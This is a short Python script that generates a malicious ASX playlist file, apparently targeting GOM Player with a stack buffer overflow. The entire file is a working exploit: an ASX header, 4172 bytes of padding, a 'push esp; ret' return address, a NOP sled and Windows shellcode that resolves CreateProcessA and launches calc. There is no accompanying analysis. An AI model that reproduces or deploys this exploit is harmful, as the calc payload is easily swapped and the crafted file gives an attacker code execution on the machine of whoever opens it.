import struct
# -*- coding: cp949 -*-
filename = "gom_exploit.asx"
offset = 4172
head1 = ("\xFF\xFE\x3C\x00\x61\x00\x73\x00\x78\x00"
"\x20\x00\x76\x00\x65\x00\x72\x00\x73\x00"
"\x69\x00\x6F\x00\x6E\x00\x20\x00\x3D\x00"
"\x20\x00\x22\x00\x33\x00\x2E\x00\x30\x00"
"\x22\x00\x20\x00\x3E\x00\x0D\x00\x0A\x00"
"\x3C\x00\x65\x00\x6E\x00\x74\x00\x72\x00"
"\x79\x00\x3E\x00\x0D\x00\x0A\x00\x3C\x00"
"\x72\x00\x65\x00\x66\x00\x20\x00\x68\x00"
"\x72\x00\x65\x00\x66\x00\x20\x00\x3D\x00"
"\x20\x00\x22\x00")
head2 = ("\x22\x00\x20\x00\x2F\x00\x3E\x00\x0D\x00"
"\x0A\x00\x3C\x00\x2F\x00\x65\x00\x6E\x00"
"\x74\x00\x72\x00\x79\x00\x3E\x00\x0D\x00"
"\x0A\x00\x3C\x00\x2F\x00\x61\x00\x73\x00"
"\x78\x00\x3E\x00\x0D\x00\x0A\x00")
shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
"\x45\x81\x3e\x43\x72\x65\x61\x75"
"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
"\x6c\x63\x89\xe2\x52\x52\x53\x53"
"\x53\x53\x53\x53\x52\x53\xff\xd7")
exploit = head1
exploit += "A" * offset
exploit += struct.pack('<I', 0x0041ef13) # push esp # ret 0x04
exploit += "\x90" * 40
exploit += shellcode
exploit += head2
f = open(filename,'wb')
f.write(exploit)
f.close()